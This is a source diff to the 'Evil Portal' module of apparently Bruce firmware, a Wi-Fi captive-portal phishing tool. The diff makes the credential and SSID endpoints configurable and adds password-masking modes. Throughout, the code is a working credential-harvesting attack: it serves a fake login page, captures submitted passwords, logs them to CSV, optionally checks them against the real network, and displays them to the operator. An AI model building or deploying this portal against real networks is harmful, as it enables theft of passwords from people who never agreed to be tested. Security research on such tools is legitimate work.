@@ -1,4 +1,5 @@
 #include "evil_portal.h"
+#include "core/config.h"
 #include "core/display.h"
 #include "core/mykeyboard.h"
 #include "core/sd_functions.h"
@@ -27,12 +28,18 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
     String url = request->url();
     if (url == "/") _portal->portalController(request);
     else if (url == "/post") _portal->credsController(request);
-    else if (url == "/creds") request->send(200, "text/html", _portal->creds_GET());
-    else if (url == "/ssid") request->send(200, "text/html", _portal->ssid_GET());
-    else if (url == "/postssid") {
-        if (request->hasArg("ssid")) _portal->apName = request->arg("ssid").c_str();
-        request->send(200, "text/html", _portal->ssid_POST());
-        _portal->restartWiFi();
+    else if (url == bruceConfig.evilPortalEndpoints.getCredsEndpoint &&
+             bruceConfig.evilPortalEndpoints.allowGetCreds)
+        request->send(200, "text/html", _portal->creds_GET());
+    else if (url == bruceConfig.evilPortalEndpoints.setSsidEndpoint &&
+             bruceConfig.evilPortalEndpoints.allowSetSsid) {
+        if (request->hasArg("ssid")) {
+            _portal->apName = request->arg("ssid").c_str();
+            request->send(200, "text/html", _portal->ssid_POST());
+            _portal->restartWiFi();
+        } else {
+            request->send(200, "text/html", _portal->ssid_GET());
+        }
     } else {
         if (request->args() > 0) _portal->credsController(request);
         else _portal->portalController(request);
@@ -40,15 +47,15 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
 }
 bool EvilPortal::setup() {
     options = {
-        {"Custom Html", [=]() { loadCustomHtml(); }}
+        {"Custom Html", [this]() { loadCustomHtml(); }}
     };
     addOptionToMainMenu();
 
     if (!_verifyPwd) {
         // Insert Options
-        options.insert(options.begin(), {"Default", [=]() { loadDefaultHtml(); }});
+        options.insert(options.begin(), {"Default", [this]() { loadDefaultHtml(); }});
     } else {
-        options.insert(options.begin(), {"Default", [=]() { loadDefaultHtml_one(); }});
+        options.insert(options.begin(), {"Default", [this]() { loadDefaultHtml_one(); }});
     }
 
     loopOptions(options);
@@ -63,7 +70,7 @@ bool EvilPortal::setup() {
             apName_from_keyboard();
         } else {
             options = {
-                {"Custom Wifi", [&]() { apName_from_keyboard(); }}
+                {"Custom Wifi", [this]() { apName_from_keyboard(); }}
             };
 
             for (const auto &_wifi : bruceConfig.evilWifiNames) {
@@ -75,8 +82,8 @@ bool EvilPortal::setup() {
     }
 
     options = {
-        {"172.0.0.1",   [&]() { apGateway = IPAddress(172, 0, 0, 1); }  },
-        {"192.168.4.1", [&]() { apGateway = IPAddress(192, 168, 4, 1); }},
+        {"172.0.0.1",   [this]() { apGateway = IPAddress(172, 0, 0, 1); }  },
+        {"192.168.4.1", [this]() { apGateway = IPAddress(192, 168, 4, 1); }},
     };
 
     loopOptions(options);
@@ -133,17 +140,25 @@ void EvilPortal::setupRoutes() {
     // this must be done in the handleRequest() function too
     webServer.on("/", [this](AsyncWebServerRequest *request) { portalController(request); });
     webServer.on("/post", [this](AsyncWebServerRequest *request) { credsController(request); });
-    webServer.on("/creds", [this](AsyncWebServerRequest *request) {
-        request->send(200, "text/html", creds_GET());
-    });
-    webServer.on("/ssid", [this](AsyncWebServerRequest *request) {
-        request->send(200, "text/html", ssid_GET());
-    });
-    webServer.on("/postssid", [this](AsyncWebServerRequest *request) {
-        if (request->hasArg("ssid")) apName = request->arg("ssid").c_str();
-        request->send(200, "text/html", ssid_POST());
-        restartWiFi();
-    });
+    if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
+        webServer.on(
+            bruceConfig.evilPortalEndpoints.getCredsEndpoint.c_str(),
+            [this](AsyncWebServerRequest *request) { request->send(200, "text/html", creds_GET()); }
+        );
+    }
+    if (bruceConfig.evilPortalEndpoints.allowSetSsid) {
+        webServer.on(
+            bruceConfig.evilPortalEndpoints.setSsidEndpoint.c_str(), [this](AsyncWebServerRequest *request) {
+                if (request->hasArg("ssid")) {
+                    apName = request->arg("ssid").c_str();
+                    request->send(200, "text/html", ssid_POST());
+                    restartWiFi();
+                } else {
+                    request->send(200, "text/html", ssid_GET());
+                }
+            }
+        );
+    }
 
     webServer.onNotFound([this](AsyncWebServerRequest *request) {
         if (request->args() > 0) credsController(request);
@@ -214,9 +229,20 @@ void EvilPortal::drawScreen() {
 
     String apIp = WiFi.softAPIP().toString();
     padprintln("");
-    padprintln("-> " + apIp + "/creds");
-    padprintln("-> " + apIp + "/ssid");
-
+    if (bruceConfig.evilPortalEndpoints.showEndpoints) {
+        if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
+            padprintln("-> " + apIp + bruceConfig.evilPortalEndpoints.getCredsEndpoint + " -> get creds");
+        } else {
+            padprintln("-> cred access disabled");
+        }
+        if (bruceConfig.evilPortalEndpoints.allowSetSsid) {
+            padprintln("-> " + apIp + bruceConfig.evilPortalEndpoints.setSsidEndpoint + " -> set ssid");
+        } else {
+            padprintln("-> SSID change disabled");
+        }
+    } else {
+        padprintln("Endpoints hidden");
+    }
     padprintln("");
 
     if (!_verifyPwd) {
@@ -224,8 +250,14 @@ void EvilPortal::drawScreen() {
     } else {
         padprint("Attempt: " + String(totalCapturedCredentials));
     }
-
-    padprintln("");
+    String passMode = "";
+    switch (bruceConfig.evilPortalPasswordMode) {
+        case FULL_PASSWORD: passMode = "Full"; break;
+        case FIRST_LAST_CHAR: passMode = "p******d"; break;
+        case HIDE_PASSWORD: passMode = "*hidden*"; break;
+        case SAVE_LENGTH: passMode = "Length only"; break;
+    }
+    padprintln("Pwd mode: " + passMode);
     printLastCapturedCredential();
 
     printDeauthStatus();
@@ -487,24 +519,50 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
             continue;
         }
 
-        // get key if verify
+        // get key if verify and before blanking
         if (key == "password" && _verifyPwd) { passwordValue = request->arg(i); }
 
+        String valueBuffer = request->arg(i);
+
+        if (key == "password") {
+            char blank = '*';
+            switch (bruceConfig.evilPortalPasswordMode) {
+                case FULL_PASSWORD:
+                    // do nothing, already have full password and want to save it
+                    break;
+                case FIRST_LAST_CHAR:
+                    // overwrite the middle of the passwordValue with *s
+                    if (valueBuffer.length() > 2) {
+                        for (int i = 1; i < valueBuffer.length() - 1; i++) { valueBuffer[i] = blank; }
+                    }
+                    // otherwise don't blank anything if pwd is < 2 chars
+                    break;
+                case HIDE_PASSWORD:
+                    // overwrite the passwordValue with '*hidden*'
+                    valueBuffer = "*hidden*";
+                    break;
+                case SAVE_LENGTH:
+                    // overwrite the passwordValue with 'X chars'
+                    valueBuffer = String(valueBuffer.length()) + " chars";
+                    break;
+            }
+        }
+
         // Build HTML and CSV line
-        htmlResponse += key + ": " + request->arg(i) + "<br>\n";
+        htmlResponse += key + ": " + valueBuffer + "<br>\n";
         if (i > 0) { csvLine += ","; }
 
         // Skip irrelevant parameters
 
-        csvLine += key + ": " + request->arg(i);
-        lastCred += key.substring(0, 3) + ": " + request->arg(i) + "\n";
+        csvLine += key + ": " + valueBuffer;
+        lastCred += key.substring(0, 3) + ": " + valueBuffer + "\n";
     }
 
     htmlResponse += "</li>\n";
 
     if (_verifyPwd && passwordValue != "") {
         request->send(200, "text/html", wifiLoadPage());
-        //vTaskDelay(200 / portTICK_PERIOD_MS); // give it time to process the request
+        // vTaskDelay(200 / portTICK_PERIOD_MS); // give it time to process the request
         bool isCorrect = verifyCreds(apName, passwordValue);
         if (isCorrect) {
 
@@ -528,7 +586,6 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
             saveToCSV(csvLine + ", valid: false", true);
             portalController(request);
         }
-
     } else {
         saveToCSV(csvLine);
         request->send(200, "text/html", wifiLoadPage());
@@ -550,7 +607,8 @@ String EvilPortal::getHtmlTemplate(String body) {
         "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
         "  <style>a:hover{text-decoration: underline;}body{font-family: Arial, sans-serif;align-items: "
         "center;justify-content: center;background-color: #FFFFFF;}input[type='text'], "
-        "input[type='password']{width: 100%;padding: 12px 10px;margin: 8px 0;box-sizing: border-box;border: "
+        "input[type='password']{width: 100%;padding: 12px 10px;margin: 8px 0;box-sizing: "
+        "border-box;border: "
         "1px solid #cccccc;border-radius: 4px;}.container{margin: auto;padding: 20px;max-width: "
         "700px;}.logo-container{text-align: center;margin-bottom: 30px;display: flex;justify-content: "
         "center;align-items: center;}.logo{width: 40px;height: 40px;fill: #FFC72C;margin-right: "
@@ -562,8 +620,10 @@ String EvilPortal::getHtmlTemplate(String body) {
         "none;padding: 12px 20px;border-radius: 4px;font-size: 0.875rem;}.submit-btn:hover{background: "
         "#0e4eb3;}.forgot-btn{background: transparent;color: #0b57d0;border-radius: 8px;border: "
         "none;font-size: 14px;cursor: pointer;}.forgot-btn:hover{background-color: "
-        "rgba(11,87,208,0.08);}.containerlogo{padding-top: 25px;}.containertitle{color: #202124;font-size: "
-        "24px;padding: 15px 0px 10px 0px;}.containersubtitle{color: #202124;font-size: 16px;padding: 0px 0px "
+        "rgba(11,87,208,0.08);}.containerlogo{padding-top: 25px;}.containertitle{color: "
+        "#202124;font-size: "
+        "24px;padding: 15px 0px 10px 0px;}.containersubtitle{color: #202124;font-size: 16px;padding: 0px "
+        "0px "
         "30px 0px;}.containerbtn{display: flex;justify-content: end;padding: 30px 0px 25px 0px;}@media "
         "screen and (min-width: 768px){.logo{max-width: 80px;max-height: 80px;}}</style>"
         "</head>"
@@ -588,14 +648,17 @@ String EvilPortal::getHtmlTemplate(String body) {
 String EvilPortal::creds_GET() {
     return getHtmlTemplate(
         "<ol>" + capturedCredentialsHtml +
-        "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" "
+        "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a "
+        "style=\"color:blue\" "
         "href=/clear>Clear passwords</a></p></center>"
     );
 }
 
 String EvilPortal::ssid_GET() {
     return getHtmlTemplate(
-        "<p>Set a new SSID for Evil Portal:</p><form action='/postssid' id='login-form'><input name='ssid' "
+        "<p>Set a new SSID for Evil Portal:</p><form action='" +
+        bruceConfig.evilPortalEndpoints.setSsidEndpoint +
+        "' id='login-form'><input name='ssid' "
         "class='input-field' type='text' placeholder='" +
         apName + "' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>"
     );
